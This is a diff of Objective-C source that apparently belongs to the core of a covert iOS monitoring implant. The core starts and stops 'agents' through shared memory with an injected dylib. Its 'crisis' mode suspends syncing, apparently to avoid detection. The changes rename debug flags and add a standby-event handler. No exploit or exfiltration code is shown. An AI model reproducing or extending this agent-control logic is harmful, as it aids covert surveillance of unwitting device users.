@@ -747,7 +747,7 @@ extern RCSISharedMemory *mSharedMemoryCommand;
       } 
     case AGENT_CRISIS:
       {
-#ifdef DEBUG_TMP
+#ifdef DEBUG
         NSLog(@"%s: Starting Agent Crisis", __FUNCTION__);
 #endif
         gAgentCrisis = YES;
@@ -1037,7 +1037,7 @@ extern RCSISharedMemory *mSharedMemoryCommand;
       }
     case AGENT_CRISIS:
       {
-#ifdef DEBUG_TMP
+#ifdef DEBUG
         NSLog(@"%s: Stopping Agent Crisis", __FUNCTION__);
 #endif
         gAgentCrisis = NO;
@@ -1241,7 +1241,7 @@ extern RCSISharedMemory *mSharedMemoryCommand;
               }  
             case AGENT_APPLICATION:
               {
-#ifdef DEBUG_TMP
+#ifdef DEBUG
                 NSLog(@"%s: Starting Agent Application", __FUNCTION__);
 #endif
                 agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
@@ -1262,7 +1262,7 @@ extern RCSISharedMemory *mSharedMemoryCommand;
                                             offset: OFFT_APPLICATION
                                      fromComponent: COMP_CORE])
                       {
-#ifdef DEBUG_TMP
+#ifdef DEBUG
                         NSLog(@"%s: Command START sent to Agent Application", __FUNCTION__);
 #endif
                         [anObject setObject: AGENT_RUNNING
@@ -1271,7 +1271,7 @@ extern RCSISharedMemory *mSharedMemoryCommand;
                   }
                 else
                   {
-#ifdef DEBUG_TMP
+#ifdef DEBUG
                     NSLog(@"%s: An error occurred while creating log for Agent Application", __FUNCTION__);
 #endif
                   }
@@ -1380,7 +1380,7 @@ extern RCSISharedMemory *mSharedMemoryCommand;
               }
             case AGENT_CRISIS:
               {
-#ifdef DEBUG_TMP
+#ifdef DEBUG
                 NSLog(@"%s: Starting Agent Crisis", __FUNCTION__);
 #endif
                 gAgentCrisis = YES;
@@ -1549,7 +1549,7 @@ extern RCSISharedMemory *mSharedMemoryCommand;
               }
             case AGENT_APPLICATION:
               {
-#ifdef DEBUG_TMP       
+#ifdef DEBUG       
                 NSLog(@"Stopping Agent Application");
 #endif
                 NSMutableData *agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
@@ -1563,7 +1563,7 @@ extern RCSISharedMemory *mSharedMemoryCommand;
                                         offset: OFFT_APPLICATION
                                  fromComponent: COMP_CORE] == TRUE)
                   {
-#ifdef DEBUG_TMP
+#ifdef DEBUG
                     NSLog(@"Stop command sent to Agent Application");
 #endif
                 
@@ -1649,7 +1649,7 @@ extern RCSISharedMemory *mSharedMemoryCommand;
               }
             case AGENT_CRISIS:
               {
-#ifdef DEBUG_TMP
+#ifdef DEBUG
                 NSLog(@"%s: Starting Agent Crisis", __FUNCTION__);
 #endif
                 gAgentCrisis = NO;
@@ -1790,7 +1790,7 @@ extern RCSISharedMemory *mSharedMemoryCommand;
           break;
         case EVENT_BATTERY:
           {
-#ifdef DEBUG_TMP
+#ifdef DEBUG
             NSLog(@"EVENT battery FOUND! add object");
 #endif
             RCSIEvents *events = [RCSIEvents sharedEvents];
@@ -1817,6 +1817,14 @@ extern RCSISharedMemory *mSharedMemoryCommand;
             RCSIEvents *events = [RCSIEvents sharedEvents];
             RCSINotificationCenter *center = [RCSINotificationCenter sharedInstance];
             [center addNotificationObject: (id) events withEvent: SIM_CT_EVENT];
+            break;
+          }
+        case EVENT_STANDBY:
+          {
+            RCSIEvents *events = [RCSIEvents sharedEvents];
+            [NSThread detachNewThreadSelector: @selector(eventStandBy:)
+                                     toTarget: events
+                                   withObject: anObject];
             break;
           }
         default:
@@ -1884,6 +1892,41 @@ extern RCSISharedMemory *mSharedMemoryCommand;
             [anObject setValue: EVENT_STOPPED forKey: @"status"];
             break;
           }
+          case EVENT_STANDBY:
+          {
+            // 
+            NSMutableData *standByCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
+            
+            shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[standByCommand bytes];
+            shMemoryHeader->agentID         = OFFT_STANDBY;
+            shMemoryHeader->direction       = D_TO_AGENT;
+            shMemoryHeader->command         = AG_STOP;
+            shMemoryHeader->commandDataSize = 0;
+            
+            memset(shMemoryHeader->commandData, 0, sizeof(shMemoryHeader->commandData));
+            
+#ifdef DEBUG
+            NSLog(@"%s: sending standby command to dylib", __FUNCTION__);
+#endif
+            
+            if ([mSharedMemoryCommand writeMemory: standByCommand
+                                           offset: OFFT_STANDBY
+                                    fromComponent: COMP_CORE])
+            {
+#ifdef DEBUG
+              NSLog(@"%s: sending standby command to dylib: done!", __FUNCTION__);
+#endif
+            }
+            else 
+            {
+#ifdef DEBUG
+              NSLog(@"%s: sending standby command to dylib: error!", __FUNCTION__);
+#endif
+            }
+            
+            [standByCommand release]; 
+            break;
+          }
         }
     
       while ([anObject objectForKey: @"status"] != EVENT_STOPPED
@@ -1933,7 +1976,7 @@ extern RCSISharedMemory *mSharedMemoryCommand;
           {
             if (gAgentCrisis == NO) 
               {
-#ifdef DEBUG_TMP
+#ifdef DEBUG
                 NSLog(@"%s: crisis agent not active sync!", __FUNCTION__);
 #endif
                 NSNumber *status = [NSNumber numberWithInt: 1];
@@ -1943,7 +1986,7 @@ extern RCSISharedMemory *mSharedMemoryCommand;
               }
             else 
               {
-#ifdef DEBUG_TMP
+#ifdef DEBUG
                 NSLog(@"%s: crisis agent active don't sync!", __FUNCTION__);
 #endif
               }
